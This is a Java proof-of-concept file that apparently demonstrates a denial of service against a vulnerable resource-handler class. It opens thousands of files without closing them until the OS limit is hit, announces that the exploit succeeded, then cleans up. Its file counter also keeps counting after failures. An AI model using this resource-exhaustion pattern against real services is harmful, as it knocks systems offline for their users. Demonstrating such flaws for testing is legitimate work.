import java.io.IOException;
import java.io.File;

public class ResourceLeakExploit {

    public static void main(String[] args) {
        VulnerableResourceHandler handler = new VulnerableResourceHandler();
        String baseFilename = "leaked_file_";
        // The number of files that can be opened is limited by the OS.
        // We will try to open a large number to demonstrate the limit.
        int maxFilesToAttempt = 10240; 
        int openedFiles = 0;

        System.out.println("Attempting to cause a resource leak by opening many files without closing them...");

        
            for (int i = 0; i < maxFilesToAttempt; i++) {
                try {
                    String filename = baseFilename + i + ".txt";
                    // Each call to processData will open a file and not close it.
                    handler.processData(filename, "Leaked data for file " + i, true);
                   
                } catch (Exception e) {
                    System.err.println("\nCaught exception after opening " + openedFiles + " files: " + e.getMessage());
                    System.err.println("This is likely due to resource exhaustion (e.g., 'Too many open files').");
                    System.err.println("!!! EXPLOIT SUCCESSFUL: Denial of Service demonstrated. !!!");
                }
                openedFiles++;
            }

        System.out.println("\nFinished attempt. Total files successfully opened and leaked: " + openedFiles);

        // Clean up created files
        System.out.println("\nCleaning up created files...");
        for (int i = 0; i < openedFiles; i++) {
            File file = new File(baseFilename + i + ".txt");
            if (file.exists()) {
                file.delete();
            }
        }
        System.out.println("Cleanup complete.");
    }
}

